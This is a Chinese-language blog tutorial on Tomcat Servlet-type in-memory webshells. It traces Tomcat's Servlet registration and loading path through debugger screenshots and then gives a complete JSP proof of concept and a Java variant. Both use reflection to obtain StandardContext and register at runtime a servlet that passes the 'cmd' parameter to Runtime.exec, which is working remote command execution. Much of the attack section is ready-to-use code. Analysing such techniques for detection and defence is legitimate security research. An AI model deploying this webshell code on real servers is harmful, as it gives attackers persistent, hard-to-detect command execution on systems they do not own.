---
title: Java 内存马之 Servlet 型内存马
date: 2026-10-26
---

# Java 内存马之 Servlet 型内存马

## Servlet 创建

创建一个 Servlet 的流程是`init()`->`doXXX`->`destroy()`。

先看一下 Servlet 这个接口有哪些方法：

```java
public interface Servlet {  
   void init(ServletConfig var1) throws ServletException; // init方法，创建好实例后会被立即调用，仅调用一次。  
  
   ServletConfig getServletConfig();//返回一个ServletConfig对象，其中包含这个servlet初始化和启动参数  
  
   void service(ServletRequest var1, ServletResponse var2) throws ServletException, IOException;  //每次调用该servlet都会执行service方法，service方法中实现了我们具体想要对请求的处理。  
  
   String getServletInfo();//返回有关servlet的信息，如作者、版本和版权.  
  
   void destroy();//只会在当前servlet所在的web被卸载的时候执行一次，释放servlet占用的资源  
}
```

从 Servlet 接口中我们可以看出，如果我们要写恶意代码，应该是写在`service()`中，所以这里我们直接创建一个恶意的 Servlet 类：

```java
package tomcatshell.servlet;

import javax.servlet.*;
import javax.servlet.annotation.WebServlet;
import java.io.IOException;

@WebServlet(name="servletshell",value = "/servletshell")
public class ServletTest implements Servlet {
    @Override
    public void init(ServletConfig config) throws ServletException {

    }

    @Override
    public ServletConfig getServletConfig() {
        return null;
    }

    @Override
    public void service(ServletRequest req, ServletResponse res) throws ServletException, IOException {
        String cmd = req.getParameter("cmd");
        if (cmd != null) {
            try {
                Runtime.getRuntime().exec(cmd);
            } catch (IOException e) {
                throw new RuntimeException(e);
            }
        }
    }

    @Override
    public String getServletInfo() {
        return "";
    }

    @Override
    public void destroy() {

    }
}
```

## Servlet 流程分析

因为 Web 应用程序的顺序是 Listener -> Filter -> Servlet，所以我们在调用 Servlet 的时候也会看到之前 Listener 和 Filter 的流程。

先把断点下在`service()`方法，可以看到这个地方是有 Filter 的流程的。

![](https://drun1baby.top/2022/09/04/Java%E5%86%85%E5%AD%98%E9%A9%AC%E7%B3%BB%E5%88%97-05-Tomcat-%E4%B9%8B-Servlet-%E5%9E%8B%E5%86%85%E5%AD%98%E9%A9%AC/ContainsFilter.png)

### 获取到 HTTP 请求

断点打在`HTTP11Processor`类的`service()`方法，重新开始调试。

![](https://drun1baby.top/2022/09/04/Java%E5%86%85%E5%AD%98%E9%A9%AC%E7%B3%BB%E5%88%97-05-Tomcat-%E4%B9%8B-Servlet-%E5%9E%8B%E5%86%85%E5%AD%98%E9%A9%AC/HTTP11Processor.png)

这个`HTTP11Processor`类是一个网络请求的类，它的作用是处理数据包，而它的`service()`方法主要是处理 HTTP 包的请头，主要做了赋值的工作，后续会通过`ByteBuff`进行数据解析。

往下走，走到一行`this.getAdapter().service(this.request, this.response);`这里。

![](https://drun1baby.top/2022/09/04/Java%E5%86%85%E5%AD%98%E9%A9%AC%E7%B3%BB%E5%88%97-05-Tomcat-%E4%B9%8B-Servlet-%E5%9E%8B%E5%86%85%E5%AD%98%E9%A9%AC/343Service.png)

跟进去，进入`CoyoteAdapter`类的`service()`方法中，`CoyoteAdapter`是`Processor`和`Valve`之间的适配器。

![](https://drun1baby.top/2022/09/04/Java%E5%86%85%E5%AD%98%E9%A9%AC%E7%B3%BB%E5%88%97-05-Tomcat-%E4%B9%8B-Servlet-%E5%9E%8B%E5%86%85%E5%AD%98%E9%A9%AC/coyoteAdapter.png)

关注一下传参，参数是`org.apache.coyote.Request`和`org.apache.coyote.Response`类型的对象，后面又进行了`getNote()`方法的调用。

![](https://drun1baby.top/2022/09/04/Java%E5%86%85%E5%AD%98%E9%A9%AC%E7%B3%BB%E5%88%97-05-Tomcat-%E4%B9%8B-Servlet-%E5%9E%8B%E5%86%85%E5%AD%98%E9%A9%AC/reqAndres.png)

![](https://drun1baby.top/2022/09/04/Java%E5%86%85%E5%AD%98%E9%A9%AC%E7%B3%BB%E5%88%97-05-Tomcat-%E4%B9%8B-Servlet-%E5%9E%8B%E5%86%85%E5%AD%98%E9%A9%AC/getNote.png)

这两个`getNote()`方法都是取`notes`数组里指定 pos 的对象。继续往下，如果`request == null`，就会进行一系列赋值：

![](https://drun1baby.top/2022/09/04/Java%E5%86%85%E5%AD%98%E9%A9%AC%E7%B3%BB%E5%88%97-05-Tomcat-%E4%B9%8B-Servlet-%E5%9E%8B%E5%86%85%E5%AD%98%E9%A9%AC/requestValue.png)

直到`this.connector.getService().getContainer().getPipeline().getFirst().invoke(request, response);`这一行：

![](https://drun1baby.top/2022/09/04/Java%E5%86%85%E5%AD%98%E9%A9%AC%E7%B3%BB%E5%88%97-05-Tomcat-%E4%B9%8B-Servlet-%E5%9E%8B%E5%86%85%E5%AD%98%E9%A9%AC/coyoteAdapterService.png)

首先是变量`connector`，里面存放了一整个 HTTP 包。

![](https://drun1baby.top/2022/09/04/Java%E5%86%85%E5%AD%98%E9%A9%AC%E7%B3%BB%E5%88%97-05-Tomcat-%E4%B9%8B-Servlet-%E5%9E%8B%E5%86%85%E5%AD%98%E9%A9%AC/connector.png)

`connector.getService()`返回的是 Connector 关联的 Service 熟悉，也就是`StandardService`对象。

![](https://drun1baby.top/2022/09/04/Java%E5%86%85%E5%AD%98%E9%A9%AC%E7%B3%BB%E5%88%97-05-Tomcat-%E4%B9%8B-Servlet-%E5%9E%8B%E5%86%85%E5%AD%98%E9%A9%AC/getService.png)

`connector.getService().getContainer()`返回的是 Service 中的容器 Engine 属性，也就是`StandardEngine`对象。

![](https://drun1baby.top/2022/09/04/Java%E5%86%85%E5%AD%98%E9%A9%AC%E7%B3%BB%E5%88%97-05-Tomcat-%E4%B9%8B-Servlet-%E5%9E%8B%E5%86%85%E5%AD%98%E9%A9%AC/getContainer.png)

`connector.getService().getContainer().getPipeline()`返回的是`StandardEngine`里的`Pipeline`属性，也就是`StandardPipeline`对象。

![](https://drun1baby.top/2022/09/04/Java%E5%86%85%E5%AD%98%E9%A9%AC%E7%B3%BB%E5%88%97-05-Tomcat-%E4%B9%8B-Servlet-%E5%9E%8B%E5%86%85%E5%AD%98%E9%A9%AC/getPipeline.png)

返回的是`StandardPipeline`的 Valve 类型的数行 first 或者 basic。

![](https://drun1baby.top/2022/09/04/Java%E5%86%85%E5%AD%98%E9%A9%AC%E7%B3%BB%E5%88%97-05-Tomcat-%E4%B9%8B-Servlet-%E5%9E%8B%E5%86%85%E5%AD%98%E9%A9%AC/getFirst.png)

然后走到`invoke()`方法中，`StandardEngineValve#inovke()`进行 Host 相关的简单判断，再往下，host 是 Tomcat 内置的 host。后续的内容和 Filter 比较像，就是多个`invoke()`调用，所以这就是一个获取到 HTTP 请求进行预处理的过程。

### 读取 web.xml

断点打在`ContextConfig#webConfig()`，读取 web.xml 的流程和 Listener 型内存马类似。

开始调试，首先我们获取到了 web.xml 文件：

![](https://drun1baby.top/2022/09/04/Java%E5%86%85%E5%AD%98%E9%A9%AC%E7%B3%BB%E5%88%97-05-Tomcat-%E4%B9%8B-Servlet-%E5%9E%8B%E5%86%85%E5%AD%98%E9%A9%AC/getWebXml.png)

中间是处理 Filter、Listener 等信息的代码，所以这里跳过，到下面的`configureContext(webXml)`。

![](https://drun1baby.top/2022/09/04/Java%E5%86%85%E5%AD%98%E9%A9%AC%E7%B3%BB%E5%88%97-05-Tomcat-%E4%B9%8B-Servlet-%E5%9E%8B%E5%86%85%E5%AD%98%E9%A9%AC/into.png)

跟进，看到`configureContext()`方法也是先获取 Listener、Filter，还有`localeEncodingMappings`等，继续向下，直到 1281 行开始进行 Servlet 的读取。

![](https://drun1baby.top/2022/09/04/Java%E5%86%85%E5%AD%98%E9%A9%AC%E7%B3%BB%E5%88%97-05-Tomcat-%E4%B9%8B-Servlet-%E5%9E%8B%E5%86%85%E5%AD%98%E9%A9%AC/fourServlets.png)

### 创建与装载 StandardWrapper

第 1282 行，`createWrapper()` 实际上就是创建了`StandardWrapper`，后续代码会对它进行加载和处理。

再往下，会将所有的 Servlet 保存到 Wrapper 中，后面代码很多是在把 web.xml 中的数据写到`StandardWrapper`中：

![](https://drun1baby.top/2022/09/04/Java%E5%86%85%E5%AD%98%E9%A9%AC%E7%B3%BB%E5%88%97-05-Tomcat-%E4%B9%8B-Servlet-%E5%9E%8B%E5%86%85%E5%AD%98%E9%A9%AC/getServletName.png)

继续往下看，到 1334 行，将 Wrapper 添加到`context`中，这里的`context`就是`StandardContext`。

![](https://drun1baby.top/2022/09/04/Java%E5%86%85%E5%AD%98%E9%A9%AC%E7%B3%BB%E5%88%97-05-Tomcat-%E4%B9%8B-Servlet-%E5%9E%8B%E5%86%85%E5%AD%98%E9%A9%AC/addChild.png)

后续把 web.xml 中的内容装载进`StandardWrapper`中，也就是`StandardWrapper`的装载。

那么，Wrapper 中包含了我们的恶意 Servlet 内存马，那 Wrapper 最后被放到哪里了？其实`addChild()`方法把 Wrapper 放到了`StandardContext`中去了，之后做了一系列处理。

我们跟进`addChild()`方法，此时到的是`StandardContext`类的`addChild()`方法，它判断这个 Servlet 是否是 JSP 的 Servlet：

![](https://drun1baby.top/2022/09/04/Java%E5%86%85%E5%AD%98%E9%A9%AC%E7%B3%BB%E5%88%97-05-Tomcat-%E4%B9%8B-Servlet-%E5%9E%8B%E5%86%85%E5%AD%98%E9%A9%AC/addChildJSP.png)

然后运行到`super.addChild(child);`这里，是`ContainerBase`这个抽象类。`ContainerBase`类的`addChild()`方法判断了是否开启全局安全这个配置。往下，跟进到`addChildInternal()`方法中：

![](https://drun1baby.top/2022/09/04/Java%E5%86%85%E5%AD%98%E9%A9%AC%E7%B3%BB%E5%88%97-05-Tomcat-%E4%B9%8B-Servlet-%E5%9E%8B%E5%86%85%E5%AD%98%E9%A9%AC/addChildInternal.png)

然后到 753 行这里调用了一个语句：

```java
child.start();
```

`start()`方法，就是启动一个线程，在 Servlet 中就是开启此 Servlet 的线程，跟进去看一下 Servlet 的线程被启动后做了什么。

![](https://drun1baby.top/2022/09/04/Java%E5%86%85%E5%AD%98%E9%A9%AC%E7%B3%BB%E5%88%97-05-Tomcat-%E4%B9%8B-Servlet-%E5%9E%8B%E5%86%85%E5%AD%98%E9%A9%AC/LifecycleBase.png)

从`ContainerBase`类进入`LifecycleBase`类。

![](https://drun1baby.top/2022/09/04/Java%E5%86%85%E5%AD%98%E9%A9%AC%E7%B3%BB%E5%88%97-05-Tomcat-%E4%B9%8B-Servlet-%E5%9E%8B%E5%86%85%E5%AD%98%E9%A9%AC/LifecycleBaseInit.png)

`LifecycleBase`类的`start()`方法先进行一些基础的日志判断，然后走到`init()`方法中。`init()`方法中是一些赋值，主要看后面的`startInternal()`。

![](https://drun1baby.top/2022/09/04/Java%E5%86%85%E5%AD%98%E9%A9%AC%E7%B3%BB%E5%88%97-05-Tomcat-%E4%B9%8B-Servlet-%E5%9E%8B%E5%86%85%E5%AD%98%E9%A9%AC/startInternal.png)

直接跟进的话进不去`StandardContext#startInternal()`方法，所以在`StandardContext#startInternal()`这里打上断点，直接调试过去。

![](https://drun1baby.top/2022/09/04/Java%E5%86%85%E5%AD%98%E9%A9%AC%E7%B3%BB%E5%88%97-05-Tomcat-%E4%B9%8B-Servlet-%E5%9E%8B%E5%86%85%E5%AD%98%E9%A9%AC/StandardWrapperstartInternal.png)

往下走，到 5130 行，调用了`fireLifecycleEvent()`，这个方法主要做解析 web.xml 的工作。

![](https://drun1baby.top/2022/09/04/Java%E5%86%85%E5%AD%98%E9%A9%AC%E7%B3%BB%E5%88%97-05-Tomcat-%E4%B9%8B-Servlet-%E5%9E%8B%E5%86%85%E5%AD%98%E9%A9%AC/fireLifecycleEvent.png)

继续往下调试，又会走到`ContextConfig#configureContext()`方法。

![](https://drun1baby.top/2022/09/04/Java%E5%86%85%E5%AD%98%E9%A9%AC%E7%B3%BB%E5%88%97-05-Tomcat-%E4%B9%8B-Servlet-%E5%9E%8B%E5%86%85%E5%AD%98%E9%A9%AC/configureContext.png)

总的来说，`addChild()`方法把 Servlet 放进 children zhong ,children 就是`StandardWrapper`。

![](https://drun1baby.top/2022/09/04/Java%E5%86%85%E5%AD%98%E9%A9%AC%E7%B3%BB%E5%88%97-05-Tomcat-%E4%B9%8B-Servlet-%E5%9E%8B%E5%86%85%E5%AD%98%E9%A9%AC/addChildDown.png)

在`addChild()`方法之后，调用`addServletMappingDecoded()`方法添加映射关系。

将 URL 路径和 Servlet 类做映射。

![](https://drun1baby.top/2022/09/04/Java%E5%86%85%E5%AD%98%E9%A9%AC%E7%B3%BB%E5%88%97-05-Tomcat-%E4%B9%8B-Servlet-%E5%9E%8B%E5%86%85%E5%AD%98%E9%A9%AC/addServletMappingDecoded.png)

Servlet 的生成与动态添加依次进行以下步骤：

- 通过`context.createWapper()`创建 Wrapper 对象
- 设置 Servlet 的`LoadOnStartUp`的值
- 设置 Servlet 的 Name
- 设置 Servlet 对应的 class
- 将 Servlet 添加到 context 的 children 中。
- 将 URL 路径和 Servlet 类做映射

### 加载 Servlet

我们在`StandardContext#startInternal()`中，进入`fireLifecycleEvent()`方法，之后又做了一次`StandardWrapper`的装载工作。

![](https://drun1baby.top/2022/09/04/Java%E5%86%85%E5%AD%98%E9%A9%AC%E7%B3%BB%E5%88%97-05-Tomcat-%E4%B9%8B-Servlet-%E5%9E%8B%E5%86%85%E5%AD%98%E9%A9%AC/fireLifecycleEvent2.png)

所以这里我们重新回到`StandardContext#startInternal()`中，从`fireLifecycleEvent()`往下走。

继续往下走，大致是一些赋值，主要在下面：

![](https://drun1baby.top/2022/09/04/Java%E5%86%85%E5%AD%98%E9%A9%AC%E7%B3%BB%E5%88%97-05-Tomcat-%E4%B9%8B-Servlet-%E5%9E%8B%E5%86%85%E5%AD%98%E9%A9%AC/loadOnStartUp.png)

跟进到`loadOnStartup()`方法；

![](https://drun1baby.top/2022/09/04/Java%E5%86%85%E5%AD%98%E9%A9%AC%E7%B3%BB%E5%88%97-05-Tomcat-%E4%B9%8B-Servlet-%E5%9E%8B%E5%86%85%E5%AD%98%E9%A9%AC/loadOnStartUpCode.png)

可以看到它对`loadOnStartUp`属性进行了判断：

![](https://drun1baby.top/2022/09/04/Java%E5%86%85%E5%AD%98%E9%A9%AC%E7%B3%BB%E5%88%97-05-Tomcat-%E4%B9%8B-Servlet-%E5%9E%8B%E5%86%85%E5%AD%98%E9%A9%AC/JudgeloadOnStartUp.png)

在 Servlet 的配置中，`<load-on-startup>1</load-on-startup>`的含义是：标记容器是否在启动时就加载这个 Servlet。当值大于等于 0 时，表示容器在应用启动时就加载这个 Servlet；当是负数或者没有指定时，则表示容器在该 Servlet 被选择时才被加载。正数的值越小，启动该 Servlet 的优先级越高。

如果要在 web.xml 中配置应该是这样：`<load-on-startup>1</load-on-startup>`。

这里对应的实际上是 Tomcat Servlet 的懒加载机制。

很明显这里 web.xml 的内容不是我们可控的，所以必须要把恶意的 Servlet 放到最前面去加载。

## Servlet 内存马

 ### Servlet 工作流程总结

首先获取到 HTTP 请求，然后读取到 web.xml，并且`webConfig()`方法中还创建了一个`StandardWrapper`，而我们的 Servlet 都会被保存到这个`StandardWrapper`中，后续这个 Wrapper 是放到 Context 中的，一个 Context 对应一个 Web 应用，可以包含多个 Wrapper，一个 Wrapper 对应一个 Servlet，负责管理 Servlet。在创建和加载完`StandardWrapper`之后，我们需要把加载的 Servlet 从`StandardWrapper`中读取出来，所以这里就到了我们最后的一个过程：加载 Servlet，对应有一个很重要的属性值——`loadOnStartUp`。

### Servlet 内存马的攻击

攻击主要有几个关键点：

1. StandardWrapper
2. StandardContext
3. 恶意 Servlet

![](https://drun1baby.top/2022/09/04/Java%E5%86%85%E5%AD%98%E9%A9%AC%E7%B3%BB%E5%88%97-05-Tomcat-%E4%B9%8B-Servlet-%E5%9E%8B%E5%86%85%E5%AD%98%E9%A9%AC/AttackRoute.png)

1. 获取`StandardContext`对象
2. 编写恶意 Servlet
3. 通过`StandardContext.createWrapper()`来创建`StandardWrapper`对象
4. 设置`StandardWrapper`对象的`loadOnStartup`属性值
5. 设置`StandardWrapper`对象的`ServletName`属性值
6. 设置`StandardWrapper`对象的`ServletClass`属性值
7. 将`StandardWrapper`对象添加进`StandardContext`对象的`children`属性中
8. 通过`StandardContext.addServletMappingDecoded()`添加对应的路径映射

### JSP 版 POC

#### 获取 StandardContext 对象

`StandardContext`对象获取方式多种多样：

```jsp
<%   
	Field reqF = request.getClass().getDeclaredField("request");    
	reqF.setAccessible(true);    
	Request req = (Request) reqF.get(request);    	
	StandardContext standardContext = (StandardContext) req.getContext();
%>
```

或者

```jsp
<%   
	ServletContext servletContext = request.getSession().getServletContext();    
	Field appContextField = servletContext.getClass().getDeclaredField("context");
	appContextField.setAccessible(true);    
    ApplicationContext applicationContext = (ApplicationContext) appContextField.get(servletContext);
	Field standardContextField = applicationContext.getClass().getDeclaredField("context");
	standardContextField.setAccessible(true);    
	StandardContext standardContext = (StandardContext) standardContextField.get(applicationContext);
%>
```

#### 编写恶意 Servlet

```jsp
<%!
 
    public class Shell_Servlet implements Servlet {
        @Override
        public void init(ServletConfig config) throws ServletException {
        }
        @Override
        public ServletConfig getServletConfig() {
            return null;
        }
        @Override
        public void service(ServletRequest req, ServletResponse res) throws ServletException, IOException {
            String cmd = req.getParameter("cmd");
            if (cmd !=null){
                try{
                    Runtime.getRuntime().exec(cmd);
                }catch (IOException e){
                    e.printStackTrace();
                }catch (NullPointerException n){
                    n.printStackTrace();
                }
            }
        }
        @Override
        public String getServletInfo() {
            return null;
        }
        @Override
        public void destroy() {
        }
    }
 
%>
```

#### 创建 Wrapper 对象

```jsp
<%
    Shell_Servlet shell_servlet = new Shell_Servlet();
    String name = shell_servlet.getClass().getSimpleName();
 
    Wrapper wrapper = standardContext.createWrapper();
    wrapper.setLoadOnStartup(1);
    wrapper.setName(name);
    wrapper.setServlet(shell_servlet);
    wrapper.setServletClass(shell_servlet.getClass().getName());
%>
```

把 Wrapper 添加到`StandardContext`：

```jsp
<%
    standardContext.addChild(wrapper);
    standardContext.addServletMappingDecoded("/shell",name);
%>
```

#### 完整 POC

```jsp
<%@ page import="java.lang.reflect.Field" %>
<%@ page import="org.apache.catalina.core.StandardContext" %>
<%@ page import="org.apache.catalina.connector.Request" %>
<%@ page import="java.io.IOException" %>
<%@ page import="org.apache.catalina.Wrapper" %>
<%@ page contentType="text/html;charset=UTF-8" language="java" %>
 
<%
    Field reqF = request.getClass().getDeclaredField("request");
    reqF.setAccessible(true);
    Request req = (Request) reqF.get(request);
    StandardContext standardContext = (StandardContext) req.getContext();
%>
 
<%!
 
    public class Shell_Servlet implements Servlet {
        @Override
        public void init(ServletConfig config) throws ServletException {
        }
        @Override
        public ServletConfig getServletConfig() {
            return null;
        }
        @Override
        public void service(ServletRequest req, ServletResponse res) throws ServletException, IOException {
            String cmd = req.getParameter("cmd");
            if (cmd !=null){
                try{
                    Runtime.getRuntime().exec(cmd);
                }catch (IOException e){
                    e.printStackTrace();
                }catch (NullPointerException n){
                    n.printStackTrace();
                }
            }
        }
        @Override
        public String getServletInfo() {
            return null;
        }
        @Override
        public void destroy() {
        }
    }
 
%>
 
<%
    Shell_Servlet shell_servlet = new Shell_Servlet();
    String name = shell_servlet.getClass().getSimpleName();
 
    Wrapper wrapper = standardContext.createWrapper();
    wrapper.setLoadOnStartup(1);
    wrapper.setName(name);
    wrapper.setServlet(shell_servlet);
    wrapper.setServletClass(shell_servlet.getClass().getName());
%>
 
<%
    standardContext.addChild(wrapper);
    standardContext.addServletMappingDecoded("/servletshell",name);
%>
```

Servlet 型内存马无法使所有请求都经过恶意代码，只有访问我们设定的 URL 才能触发，这是 Servlet 型内存马的缺点，而且容易被发现。需要先访问 Servlet.jsp，完成对内存马的注册，然后再访问`/servletshell`，并带上`cmd`参数才能实现命令执行。

### Java 型内存马

Java 型内存马是需要在 web.xml 中加上 Servlet 的调用的：

```java
package tomcatShell.Servlet;  
  
import org.apache.catalina.Wrapper;  
import org.apache.catalina.connector.Request;  
import org.apache.catalina.core.StandardContext;  
  
import javax.servlet.*;  
import javax.servlet.http.HttpServletRequest;  
import javax.servlet.http.HttpServletResponse;  
import java.io.BufferedReader;  
import java.io.IOException;  
import java.io.InputStream;  
import java.io.InputStreamReader;  
import java.lang.reflect.Field;  
  
public class ServletShell implements Servlet {  
    @Override  
 	public void init(ServletConfig servletConfig) throws ServletException {  
  
    }  
  
    @Override  
 	public ServletConfig getServletConfig() {  
        return null;  
 	}  
  
    @Override  
 	public void service(ServletRequest servletRequest, ServletResponse servletResponse) throws ServletException, IOException {  
        Field reqF = null;  
 		try {  
            reqF = servletRequest.getClass().getDeclaredField("request");  
 		} catch (NoSuchFieldException e) {  
            e.printStackTrace();  
 		}  
        reqF.setAccessible(true);  
 		Request req = null;  
 		try {  
            req = (Request) reqF.get(servletRequest);  
 		} catch (IllegalAccessException e) {  
            e.printStackTrace();  
 		}  
        StandardContext standardContext = (StandardContext) req.getContext();  
  
 		ServletShell servletShell = new ServletShell();  
 		String name = servletShell.getClass().getSimpleName();  
  
 		Wrapper wrapper = standardContext.createWrapper();  
 		wrapper.setLoadOnStartup(1);  
 		wrapper.setName(name);  
 		wrapper.setServlet(servletShell);  
 		wrapper.setServletClass(servletShell.getClass().getName());  
 		standardContext.addChild(wrapper);  
 		standardContext.addServletMappingDecoded("/shell",name);  
  
 		String cmd = servletRequest.getParameter("cmd");  
 		if (cmd !=null){  
            try{  
                Runtime.getRuntime().exec(cmd);  
 			}catch (IOException e){  
                e.printStackTrace();  
 			}catch (NullPointerException n){  
                n.printStackTrace();  
 			}  
        }  
    }  
  
    @Override  
 	public String getServletInfo() {  
        return null;  
 	}  
  
    @Override  
 	public void destroy() {  
  
    }  
  
    public synchronized HttpServletResponse getResponseFromRequest(HttpServletRequest var1) {  
        HttpServletResponse var2 = null;  
  
 		try {  
            Field var3 = var1.getClass().getDeclaredField("response");  
 			var3.setAccessible(true);  
 			var2 = (HttpServletResponse)var3.get(var1);  
 		} catch (Exception var8) {  
            try {  
                Field var4 = var1.getClass().getDeclaredField("request");  
 				var4.setAccessible(true);  
 				Object var5 = var4.get(var1);  
 				Field var6 = var5.getClass().getDeclaredField("response");  
 				var6.setAccessible(true);  
			 	var2 = (HttpServletResponse)var6.get(var5);  
 			} catch (Exception var7) {  
            }  
        }  
  
        return var2;  
 	}  
}
```

## 总结

Servlet 型内存马相比前几种内存马更容易被查杀出来，Filter 和 Listener 型内存马更为简单粗暴，因为它们先于 Servlet 型内存马插入。

































































